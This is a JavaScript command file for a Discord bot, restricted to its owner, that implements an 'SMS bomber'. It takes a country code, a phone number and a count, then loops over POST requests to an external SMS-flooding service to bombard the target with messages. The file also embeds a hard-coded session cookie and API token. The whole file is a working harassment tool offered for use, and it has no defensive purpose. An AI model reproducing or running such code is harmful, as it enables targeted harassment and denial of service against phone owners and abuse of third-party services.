const Discord = require("discord.js");
const config = require("../config.js")
const nodefetch = require('node-fetch');
const request = require("request")
exports.run = async (bot, message, args, command, db) => {
  let args3 = args.join().substring(command.length).split(" ");
  if (message.author.id !== config.botowner && message.author.id !== "338966707680837632") {
        message.channel.send({content:'this command is only for bot owner!!!'});
        return undefined;
  }
  if (!args3) return message.channel.send({content:`please provide a valid input`})
  let cc = args3[0];
  //console.log("cc "+ cc)
  let mnumber = args3[1];
  ///console.log("mn "+ mnumber)
  let count = args3[2];
  //console.log("count "+ count)
  var smsno = 0
  for (let step = 0; step < count; step++) {
    if (smsno > 24) {
      smsno = 1
    } else { 
      smsno ++
    }

    fetch("https://mytoolstown.com/smsbomber/send/sendsms.php", {
      "headers": {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        "cookie": "PHPSESSID=ohuj36275fs3h84qtjt13c8bg5; ezCMPCCS=true; __utmc=269351917; __gads=ID=17375fddc227afcb:T=1589463138:S=ALNI_MbBVhBjhJEaXbHpzzlt1-Q-sb9ntw; ezds=ffid%3D1%2Cw%3D1024%2Ch%3D768; _ga=GA1.2.1993939542.1589463128; __qca=P0-1993533584-1589463146245; ezux_ifep_163884=true; ezouspvh=120; ezouspvv=0; ezouspva=0; ezohw=w%3D1024%2Ch%3D656; __utmz=269351917.1590329271.4.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utma=269351917.1993939542.1589463128.1590403066.1590403230.9; ezux_lpl_163884=1590405759174|10c779b5-c126-467d-70df-7864eb1f7e06|true; ezux_et_163884=2139; ezux_tos_163884=78133; __cfduid=dffc7dff1e2587006190c60338c327ba21592452573; _yeti_currency_new_3={\"dataAsOf\":\"2020-06-17T10:00:53.035Z\",\"conversions\":{\"USD\":{\"CAD\":1.3547930669,\"HKD\":7.7497347011,\"ISK\":135.1344181111,\"PHP\":50.1096568801,\"DKK\":6.5936505129,\"HUF\":305.5359037849,\"CZK\":23.4913335692,\"GBP\":0.7903254333,\"RON\":4.2765298903,\"SEK\":9.2974885037,\"IDR\":14130.049522462,\"INR\":76.0948001415,\"BRL\":5.0978952954,\"RUB\":69.3659356208,\"HRK\":6.6744782455,\"JPY\":107.348779625,\"THB\":31.1107180757,\"CHF\":0.947736116,\"EUR\":0.8843296781,\"MYR\":4.2750265299,\"BGN\":1.7295719844,\"TRY\":6.8484258932,\"CNY\":7.0782631765,\"NOK\":9.4967279802,\"NZD\":1.5452776795,\"ZAR\":17.0249380969,\"USD\":1,\"MXN\":22.0800318359,\"SGD\":1.3895472232,\"AUD\":1.4435797665,\"ILS\":3.4704633888,\"KRW\":1210.744605589,\"PLN\":3.9151043509},\"GBP\":{\"CAD\":1.7142217746,\"HKD\":9.8057513707,\"ISK\":170.9857894148,\"PHP\":63.4038267875,\"DKK\":8.3429562493,\"HUF\":386.5950542688,\"CZK\":29.7236209019,\"GBP\":1,\"RON\":5.4110999217,\"SEK\":11.7641266644,\"IDR\":17878.773637686,\"INR\":96.2828689717,\"BRL\":6.4503748461,\"RUB\":87.768826228,\"HRK\":8.445227705,\"JPY\":135.8285778225,\"THB\":39.3644399687,\"CHF\":1.1991719816,\"EUR\":1.1189437171,\"MYR\":5.4091977174,\"BGN\":2.188430122,\"TRY\":8.6653239342,\"CNY\":8.9561374063,\"NOK\":12.0162246839,\"NZD\":1.9552422513,\"ZAR\":21.5416806535,\"USD\":1.2653015553,\"MXN\":27.9378986237,\"SGD\":1.7581962627,\"AUD\":1.8265637238,\"ILS\":4.3911827235,\"KRW\":1531.9570325613,\"PLN\":4.9537876245}}}; _gid=GA1.2.871776372.1592452563; _gat_gtag_UA_143383644_1=1"
      },
      "referrer": "https://mytoolstown.com/smsbomber/",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "sendsms=true&mobno="+mnumber+"&count="+count+"0&update=1&token=7fae503cd5d878b46856bbd492f904eb&countrycode="+cc+"&smsno="+smsno,
      "method": "POST",
      "mode": "cors"
    });
  }
   message.channel.send({content:'bombing...'});

}

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: 'for owner only',
    manu: false
};

exports.help = {
    name: 'sms',
    category: 'owner-only',
    description: 'sms',
    usage: '$sms'
};